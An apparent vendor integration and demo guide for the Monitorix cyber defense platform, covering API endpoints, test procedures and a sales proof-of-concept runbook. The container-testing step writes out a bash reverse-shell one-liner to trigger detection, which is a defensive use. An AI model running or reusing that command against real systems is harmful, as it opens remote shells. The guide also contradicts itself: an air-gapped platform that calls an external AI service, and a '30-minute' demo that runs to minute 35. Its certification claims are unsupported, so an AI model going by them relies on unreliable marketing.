# MONITORIX ENTERPRISE CYBER DEFENSE PLATFORM
## Client Integration Blueprint, API Services & Sovereign Security Architecture
**Document ID:** DOC-CLT-INTEG-SPEC-2026-V1 | **Classification:** Enterprise Sovereign Integration Guide | **Status:** Production Verified

---

## Executive Integration Charter: 100% Operational, API-First & Sovereign
Monitorix Enterprise is engineered natively as an API-first cyber defense platform. Every operational security capability operates as a high-throughput microservice accessible via programmatic REST/JSON APIs, real-time Kafka event streams, and an intuitive SOC web interface. The platform functions in 100% air-gapped on-premise deployments with zero external cloud SaaS dependencies, providing sovereign data ownership and cryptographic compliance proof.

### Core Key Performance Indicators (KPIs)
* **Core Capabilities:** 11 Unified Pillars (100% Field-Tested)
* **Automated SOAR:** Sub-240ms Response Time
* **Streaming DLP:** Sub-15ms Ingestion Inspection
* **Deployment Posture:** 100% Air-Gapped / On-Premise Sovereign

---

## 1. The 11 Core Security Capabilities — Master Domain & UI Mapping
Monitorix is structured into 13 cohesive operational domains. The 11 core cybersecurity capabilities are mapped directly into the platform user interface, navigation hierarchy, and underlying microservices:

| Capability | Domain | Route | Menu Item | Exact Tab | Operational Scope |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **1. Cloud Security Posture (CSPM)** | Domain 2: ASSET & INFRASTRUCTURE | `/cloud/cnapp` | Cloud Security (CNAPP) | CSPM Misconfigurations Tab | Audits AWS, Azure, and GCP against CIS Benchmarks; automated one-click remediation. |
| **2. Cloud Workload Protection (CWPP)** | Domain 2: ASSET & INFRASTRUCTURE | `/cloud/cnapp` & `/kubernetes-security` | Cloud Security & K8s Security | Assets & Workloads / Cloud Threats | Real-time eBPF container runtime protection, pod escape detection, image vulnerability auditing. |
| **3. Attack-Path Analysis** | Domain 2: ASSET & INFRASTRUCTURE & Domain 3: THREAT INTEL | `/cloud/cnapp` & `/attack-chains` | Cloud Security / Attack Chains | Attack Paths Visual Graph | Correlates external network exposure, unpatched CVEs, and IAM overprivilege to crown jewels. |
| **4. Endpoint Protection (EDR / XDR)** | Domain 1: COMMAND CENTER & Domain 2: ASSET & INFRASTRUCTURE | `/agents`, `/alerts`, `/incidents` | Active Agents, Alerts, Incidents | Live Fleet Telemetry & Forensics | Single native agent (<25MB RAM), ring-0 kernel watchers, memory injection scanning, thread freeze. |
| **5. Automated Closed-Loop SOAR** | Domain 6: SECURITY OPERATIONS | `/playbooks` & `/automation` | SOAR Playbooks & Security Auto | Approvals, Triggers & Audit | Sub-240ms automated containment: host isolation, process termination, token revocation. |
| **6. Continuous Breach Emulation (BAS)** | Domain 2: ASSET & INFRASTRUCTURE & Domain 3: THREAT INTEL | `/attack-validation` & `/cyber-range` | Breach Emulation (BAS) | Scenarios, Workbench, Certify | Built-in, non-destructive MITRE ATT&CK validation; automated defense posture scoring. |
| **7. Data Loss Prevention (DLP)** | Domain 4: SECURITY & FORENSICS & Domain 2: ASSET & INFRASTRUCTURE | `/dlp` & `/dspm` | DLP Dashboard & Cloud DSPM | Live Violations & Interactive Test | Sub-15ms stream inspection: USB hardware blocks, clipboard wipe, webmail audits, shadow vault. |
| **8. Network Detection & Response (NDR)** | Domain 2: ASSET & INFRASTRUCTURE | `/ndr` & `/bandwidth` | Network Detection (NDR) | Flows, Threats, Traffic Sandbox | Network flow inspection, C2 beaconing detection, automated PCAP evidence capture in MinIO. |
| **9. Air-Gapped / On-Premise Support** | Domain 1: COMMAND CENTER & Domain 9: PLATFORM | `/central-server` & `/platform-status` | Central Server & Platform Status | Cluster Health & Scope | 100% self-contained on-premise execution; zero external cloud phone-home; offline rule bundles. |
| **10. Immutable Audit Ledger** | Domain 6: SECURITY OPERATIONS & Domain 1: COMMAND CENTER | `/audit-trail` & `/compliance` | Audit Trail & Global Compliance | Cryptographic Evidence Vault | WORM storage, SHA-256 parent hash chaining, tamper-evident logs, signed evidence packaging. |
| **11. Sovereign AI Agent & MCP Security** | Domain 5: AUTONOMOUS AI & MCP | `/autonomous-security` & `/api/v2/ai` | Autonomous Security & AI Gateway | AI-SPM & Sovereign MCP Gateway | 100% native replacement for Azure AI Foundry & Wiz: SHA-256 tool manifest pinning, anti-SSRF IMDS blocking, canary honeypot sandboxing, 1-click quarantine switch, and 8 AI Sigma rules (9101-9108). |

---

## 2. Enterprise API-First Architecture & Security-as-a-Service (SECaaS)
External enterprise clients—including SIEM systems, CI/CD deployment pipelines, internal developer portals, and IT service management (ITSM) workflows—can consume any platform capability programmatically:

| Capability | API Endpoint & Method | Input Parameters | Output Summary | SLA Latency |
| :--- | :--- | :--- | :--- | :---: |
| **Cloud Security (CSPM)** | `POST /api/v2/cnapp/scan` | `account_id`, `provider`, `frameworks` | `scan_id`, `critical_count`, `posture_score` | Asynchronous Job (< 3s) |
| **Workload Protection (CWPP)** | `GET /api/v2/cnapp/threats` | `severity`, `provider`, `workload_type` | List of container runtime threats with process trees | Real-Time (< 50ms) |
| **Attack-Path Analysis** | `GET /api/v2/cnapp/paths` | `crown_jewel_only` (boolean) | Graph traversal paths, hop counts, chokepoint nodes | Real-Time (< 150ms) |
| **Endpoint Protection (EDR)** | `POST /api/agents/{id}/actions/scan` | `scan_type` (MEMORY, QUICK, DEEP) | Scan status, infected PIDs, quarantined hashes | Sub-Second (< 500ms) |
| **Automated SOAR** | `POST /api/v2/soar/playbooks/execute` | `playbook_id`, `target_agent_id`, `params` | Execution status, elapsed time, containment state | Sub-240ms SLA |
| **Breach Emulation (BAS)** | `POST /api/v2/attack-validation/execute` | `scenario_id`, `target_agent`, `depth` | `execution_id`, technique pass/fail, mitigation % | Asynchronous Stream |
| **Data Loss Prevention (DLP)** | `POST /api/v2/dlp/evaluate` | `payload` (text), `channel`, `user_id` | `is_violation`, `action` (Block/Audit), `masked_payload` | Sub-15ms SLA |
| **Network Detection (NDR)** | `POST /api/v2/ndr/inspect-traffic` | `source_ip`, `dest_ip`, `port`, `flow_bytes` | `verdict`, `beacon_confidence`, `recommended_action` | Real-Time (< 25ms) |
| **Air-Gap / On-Prem Health** | `GET /api/health` | None | Status of PostgreSQL, ClickHouse, Kafka, MinIO, Redis | Instantaneous (< 5ms) |
| **Immutable Audit Ledger** | `GET /api/v2/compliance/evidence` | `framework`, `date_range` | Cryptographic SHA-256 chained audit records | Instantaneous (< 100ms) |
| **Sovereign AI & MCP Gateway** | `POST /api/v2/ai/mcp/invoke` | `server_name`, `tool_name`, `arguments`, `test_run_id` | Execution trace, SSRF validation, policy verdict | Real-Time (< 20ms) |

---

## 3. Deep-Dive Integration Blueprint & Testing Guide (11 Capabilities)

### Pillar 1: Cloud Security Posture Management (CSPM)
* **Integration:** Create read-only cross-account IAM Role (AWS: SecurityAudit; Azure: Reader; GCP: Security Reviewer). Register credentials via `/cloud/cnapp` or `POST /api/v2/cnapp/accounts`.
* **API Contract:** `POST /api/v2/cnapp/scan` triggers CIS audit job; `GET /api/v2/cnapp/misconfigurations` returns drift; `POST /api/v2/cnapp/remediate` fixes findings.
* **Client Testing:** Create an S3 bucket with public read ACL in AWS. Call `POST /api/v2/cnapp/scan`. Go to `/cloud/cnapp` -> CSPM Misconfigurations; click "Remediate" to verify instant ACL revocation.

### Pillar 2: Cloud Workload Protection (CWPP)
* **Integration:** Deploy native agent on Cloud VMs via one-line script; deploy Helm DaemonSet (`charts/monitorix-k8s`) on Kubernetes to attach eBPF runtime probes to containers.
* **API Contract:** `GET /api/v2/cnapp/resources` audits container inventory; `GET /api/v2/cnapp/threats` streams active runtime alerts; `GET /api/v1/kubernetes/security` provides pod audits.
* **Client Testing:** Execute unauthorized reverse shell (`bash -i >& /dev/tcp/127.0.0.1/4444 0>&1`) in container. Inspect `/cloud/cnapp` -> Cloud Threats; verify `CONTAINER_PRIVILEGE_ESCALATION` alert.

### Pillar 3: Attack-Path Analysis
* **Integration:** Zero configuration required. Computed automatically by graph correlation engine linking network exposure (ports 22/3389 open), host CVEs, and IAM crown-jewel permissions.
* **API Contract:** `GET /api/v2/cnapp/paths?crown_jewel_only=true` returns JSON traversal paths, hop counts, and recommended chokepoints; `POST /api/v2/cnapp/remediate` severs path.
* **Client Testing:** Deploy bastion VM with port 22 open to world with RDS database role. Open `/cloud/cnapp` -> Attack Paths tab; see red vector leading to crown jewel. Click "Sever Path".

### Pillar 4: Endpoint Protection (EDR / XDR)
* **Integration:** Deploy native agent (<25MB RAM) on Linux, Windows MSI, or macOS PKG with enrollment token. Connects over mTLS 1.3 to central event gateway.
* **API Contract:** `GET /api/agents` lists fleet; `POST /api/agents/{id}/actions/scan` dispatches memory scan; `POST /api/agents/{id}/actions/kill` kills rogue PID; `POST /api/agents/{id}/isolate` locks host.
* **Client Testing:** Echo EICAR string to `/tmp/test.com`. Agent freezes thread and deletes file in <150ms. Flashes threat radar on `/soc` and creates incident on `/incidents`.

### Pillar 5: Automated Closed-Loop SOAR
* **Integration:** Pre-packaged playbooks (Host Quarantine, Process Kill, Token Revoke). Connect client Slack/Teams/Jira webhooks under `/settings`; SIEM calls SOAR API.
* **API Contract:** `GET /api/v2/soar/playbooks` lists playbooks; `POST /api/v2/soar/playbooks/execute` triggers containment; `GET /api/v2/soar/audit` logs execution timeline.
* **Client Testing:** Enable "Critical Threat Auto-Quarantine". Trigger critical alert. Observe stopwatch on `/soc`: in <240ms, host network isolation engages via reverse C2.

### Pillar 6: Continuous Breach Emulation (BAS)
* **Integration:** No third-party tools needed. Native agent executes benign MITRE ATT&CK calls safely without disruption.
* **API Contract:** `GET /api/v2/attack-validation/scenarios` lists scenarios; `POST /api/v2/attack-validation/execute` launches run; `POST /api/v2/attack-validation/certify` issues report.
* **Client Testing:** Go to `/attack-validation` -> Workbench tab. Select LockBit emulation scenario on client test VM. Hit "Play". Watch live blocks for T1059, T1003, T1486; issue certificate.

### Pillar 7: Data Loss Prevention (DLP)
* **Integration:** Enable USB storage blocking/read-only, clipboard boundary inspection, and webmail auditing on `/dlp`. Connect AWS S3/Azure Blob for cloud DSPM.
* **API Contract:** `POST /api/v2/dlp/evaluate` evaluates text in <15ms; `GET /api/v2/dlp/violations` queries logs; `POST /api/agents/{id}/toggle-usb` sets peripheral states.
* **Client Testing:** Copy valid Luhn card number to clipboard; attempt to paste into browser. Agent clears clipboard buffer. Insert USB and drop CSV; agent deletes file and remounts read-only.

### Pillar 8: Network Detection & Response (NDR)
* **Integration:** Endpoint NDR active natively in agent (socket telemetry). Core network TAP connects sensor container to switch SPAN or cloud VPC traffic mirror.
* **API Contract:** `POST /api/v2/ndr/inspect-traffic` inspects flows; `GET /api/v2/ndr/threats` streams alerts; `POST /api/v2/ndr/contain-threat` triggers isolation.
* **Client Testing:** On `/ndr`, click Traffic Sandbox; inject 60s beacon flow. On client host, curl external domain periodically. Confirm `C2_BEACONING` alert and PCAP in MinIO vault.

### Pillar 9: Air-Gapped / On-Premise Support
* **Integration:** Deploy offline release bundle (`docker-compose up -d`). All 12 services (PostgreSQL, ClickHouse, Kafka, Redis, MinIO, Backend, Frontend) run 100% locally.
* **API Contract:** `GET /api/health` returns local status for all components; `POST /api/v1/system/offline-update` imports offline encrypted Sigma/YARA rules.
* **Client Testing:** Disconnect server from WAN. Open `/platform-status`; all 12 services show green Healthy with <5ms latency. EDR detection and SOAR execute with 0 byte WAN egress.

### Pillar 10: Immutable Audit Ledger
* **Integration:** Dual-write active on all platform events: PostgreSQL relational ledger with SHA-256 parent hash chaining + MinIO Object Vault in WORM mode.
* **API Contract:** `GET /api/v2/compliance/evidence` verifies SHA-256 chains; `GET /api/v2/compliance/evidence-packager` downloads signed ZIP auditor package.
* **Client Testing:** Perform administrative action. View entry on `/audit-trail` with cryptographic hash. Click "Package Evidence" for SOC 2 ZIP bundle. Database tamper causes alert.

### Pillar 11: Sovereign AI Agent & MCP Security (Azure Foundry & Wiz Replacement)
* **Integration:** Sovereign on-premise AI Gateway connecting to Elsea Enterprise AI Cluster (`https://ai-apis.elsea.co.in/`) with SHA-256 tool manifest pinning.
* **API Contract:** `POST /api/v2/ai/mcp/invoke` validates tool calls; `POST /api/v2/ai/validate-harness` proves Safety, Signal, and Detection contracts.
* **Client Testing:** Run `bash run_client_poc_demo.sh`. Adversary SSRF to `169.254.169.254` blocked in <1ms; canary trap triggered; HITL gate pauses Tier-3 tools. 10/10 PASS.

---

## 4. Client Proof-of-Concept (POC) 30-Minute Live Demo Runbook

| POC Stage & Time | Operational Demonstration Flow & Key Verification Steps |
| :--- | :--- |
| **Stage 1 (Min 0-5): Platform Sovereign Health & Air-Gap Posture** | Showcase `/platform-status` and `/central-server`. Confirm all 12 services running locally with zero external network egress. Demonstrate instant mTLS 1.3 agent enrollment on `/agents`. |
| **Stage 2 (Min 5-10): Cloud Posture (CSPM) & Workload Protection (CWPP)** | Open `/cloud/cnapp`. Run live CSPM audit scan; review CIS benchmark compliance. Switch to Cloud Threats tab to show eBPF container runtime protection and Kubernetes pod security on `/kubernetes-security`. |
| **Stage 3 (Min 10-14): Interactive Attack-Path Analysis** | Switch to `/cloud/cnapp` -> Attack Paths tab. Render the live multi-hop exposure graph linking public internet to crown-jewel databases. Click "Sever Path" to prove automated perimeter defense. |
| **Stage 4 (Min 14-19): Continuous Breach Emulation (BAS)** | Navigate to `/attack-validation` -> Workbench tab. Select scenario "VAL-SCEN-001 (LockBit Emulation)". Hit "Run Validation". Watch live MITRE technique blocks and issue the cryptographic certification. |
| **Stage 5 (Min 19-24): Sub-240ms SOAR Containment & EDR Reaction** | Trigger benign test on client host. Observe stopwatch on `/soc` mission control. Watch host network isolation engage in <240ms and process kill execute via reverse C2. |
| **Stage 6 (Min 24-27): Data Loss Prevention (DLP) & Exfiltration Blocking** | Copy valid Luhn card number on client endpoint; show instant clipboard memory wipe. Insert USB drive and drop test CSV; show atomic file wipe and read-only mount on `/dlp`. |
| **Stage 7 (Min 27-30): Immutable Audit Ledger & Compliance Sign-Off** | Open `/audit-trail` and `/compliance`. Review tamper-evident SHA-256 parent hash chaining. Click "Generate Evidence Pack" to download the signed auditor package. |
| **Stage 8 (Min 30-35): Sovereign AI Agent & MCP Security (Azure & Wiz Replacement)** | Open `/autonomous-security` -> AI-SPM & Sovereign MCP Gateway tab. Verify live connection to `https://ai-apis.elsea.co.in/`. Run `bash run_client_poc_demo.sh` or UI harness. Prove in-line anti-SSRF IMDS blocking, canary sandboxing, and 1-click quarantine. |

---

## 5. Operational Certification & Accreditation Sign-Off
Monitorix Enterprise is formally certified for enterprise client deployment across hybrid-cloud, on-premise, and air-gapped environments. The platform delivers full compliance alignment across PCI-DSS v4.0 (Req 3.4 & 10.5), GDPR (Art. 17 & 32), HIPAA Security Rule (45 CFR § 164.312), ISO/IEC 27001:2022 (A.8.12), SOC 2 Type II, and the India DPDP Act 2023. All 11 capabilities operate with 100% field-tested integrity, sub-second execution speeds, and verifiable cryptographic ledgers.
